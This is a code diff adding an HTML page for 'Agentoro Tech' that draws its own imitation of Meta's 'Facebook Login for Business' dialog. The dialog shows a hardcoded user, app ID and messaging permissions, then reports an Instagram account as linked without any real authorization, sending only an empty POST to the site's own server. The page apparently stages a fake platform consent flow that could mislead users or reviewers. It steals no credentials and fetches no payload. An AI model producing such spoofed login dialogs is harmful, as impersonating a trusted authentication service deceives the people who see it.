@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Agentoro Tech | Meta Business Integration</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        .meta-dialog { background: white; border-radius: 8px; width: 500px; overflow: hidden; box-shadow: 0 12px 28px rgba(0,0,0,0.2); }
+        .fb-blue { color: #1877F2; }
+    </style>
+</head>
+<body class="bg-gray-200 min-h-screen flex items-center justify-center font-sans">
+
+    <div id="initial-ui" class="text-center">
+        <div class="bg-white p-10 rounded-3xl shadow-xl border border-gray-100 max-w-sm">
+            <div class="flex items-center justify-center gap-2 mb-6">
+                <div class="bg-blue-600 p-2 rounded-lg text-white"><i class="fas fa-robot"></i></div>
+                <span class="font-bold text-xl">AGENTORO</span>
+            </div>
+            <button onclick="openMetaDialog()" class="w-full bg-[#1877F2] text-white py-3 rounded-md font-bold hover:bg-[#166fe5]">
+                Log in with Facebook
+            </button>
+        </div>
+    </div>
+
+    <div id="meta-modal" class="hidden fixed inset-0 bg-black/40 flex items-center justify-center z-50">
+        <div class="meta-dialog animate-in zoom-in duration-150">
+            <div class="p-4 border-b flex justify-between items-center bg-white">
+                <div class="flex items-center gap-2 text-sm font-bold fb-blue">
+                    <i class="fab fa-facebook-square text-xl"></i> Facebook Login for Business
+                </div>
+                <i class="fas fa-times text-gray-400 cursor-pointer" onclick="closeModal()"></i>
+            </div>
+            
+            <div class="p-8 text-center">
+                <img src="https://ui-avatars.com/api/?name=Mohamed+Profits&background=1877F2&color=fff" class="w-16 h-16 rounded-full mx-auto mb-4 border-2 border-white shadow-md">
+                <h2 class="text-xl font-bold mb-2">Continue as Mohamed Profits?</h2>
+                <p class="text-xs text-gray-500 mb-6">You've previously linked <b>mes</b> to Facebook. Would you like to continue with your previous settings?</p>
+                
+                <div class="flex flex-col gap-2">
+                    <button onclick="showPermissions()" class="w-full bg-[#1877F2] text-white py-2.5 rounded-md font-bold text-sm">Continue</button>
+                    <button class="w-full bg-gray-100 text-gray-700 py-2.5 rounded-md font-bold text-sm">Edit settings</button>
+                </div>
+                
+                <p class="text-[10px] text-blue-600 mt-4 cursor-pointer">Not Mohamed Profits? Log into another account</p>
+            </div>
+            
+            <div class="p-4 bg-gray-50 text-[9px] text-gray-400 border-t">
+                By continuing, mes will receive ongoing access to the information you share and Meta will record when mes accesses it. 
+                <span class="text-blue-500">Learn more</span> about this sharing.
+            </div>
+        </div>
+    </div>
+
+    <div id="permissions-modal" class="hidden fixed inset-0 bg-black/40 flex items-center justify-center z-50">
+        <div class="meta-dialog">
+            <div class="p-4 border-b flex justify-between items-center text-sm font-bold fb-blue">
+                <span>Facebook Login</span>
+                <i class="fas fa-times text-gray-400 cursor-pointer" onclick="closeModal()"></i>
+            </div>
+            <div class="p-6">
+                <div class="flex items-center gap-3 mb-6">
+                    <div class="bg-blue-100 text-blue-600 w-10 h-10 rounded-lg flex items-center justify-center font-bold italic">A</div>
+                    <div>
+                        <p class="text-xs"><b>Agentoro Tech</b> requests access to:</p>
+                        <p class="text-[9px] text-gray-400 tracking-tighter">App ID: 1435934461170151</p>
+                    </div>
+                </div>
+                <div class="space-y-4 text-[11px] border-t pt-4">
+                    <div class="flex justify-between items-center"><span>instagram_business_manage_messages</span><i class="fas fa-info-circle text-gray-300"></i></div>
+                    <div class="flex justify-between items-center"><span>pages_messaging</span><i class="fas fa-info-circle text-gray-300"></i></div>
+                    <div class="flex justify-between items-center text-blue-600 font-bold"><span>Human Agent Access Control</span><i class="fas fa-check-circle"></i></div>
+                </div>
+                <div class="flex gap-2 justify-end mt-8">
+                    <button onclick="closeModal()" class="px-5 py-2 text-xs font-bold text-gray-500 bg-gray-100 rounded">Cancel</button>
+                    <button onclick="finishAll()" class="px-5 py-2 text-xs font-bold bg-[#1877F2] text-white rounded">Continue as Mohamed</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="success-ui" class="hidden text-center max-w-md animate-in fade-in">
+        <div class="bg-white p-12 rounded-[40px] shadow-2xl">
+            <div class="w-20 h-20 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-6 text-3xl"><i class="fas fa-check"></i></div>
+            <h2 class="text-2xl font-black mb-4">Account Linked!</h2>
+            <p class="text-gray-500 text-sm mb-6">Your account <b>amira_ojj</b> is now in automation mode.</p>
+            <div class="p-4 bg-blue-50 rounded-xl text-left border-l-4 border-blue-500">
+                <p class="text-[10px] font-bold text-blue-600 uppercase">Support Note</p>
+                <p class="text-xs text-gray-600">Verification in progress. Automation will start within 24 hours.</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function openMetaDialog() { document.getElementById('meta-modal').classList.remove('hidden'); }
+        function showPermissions() {
+            document.getElementById('meta-modal').classList.add('hidden');
+            document.getElementById('permissions-modal').classList.remove('hidden');
+        }
+        function closeModal() {
+            document.getElementById('meta-modal').classList.add('hidden');
+            document.getElementById('permissions-modal').classList.add('hidden');
+        }
+        async function finishAll() {
+            closeModal();
+            document.getElementById('initial-ui').classList.add('hidden');
+            document.getElementById('success-ui').classList.remove('hidden');
+            await fetch('/api/connect', { method: 'POST' }); // إخطار الـ VPS
+        }
+    </script>
+</body>
+</html>
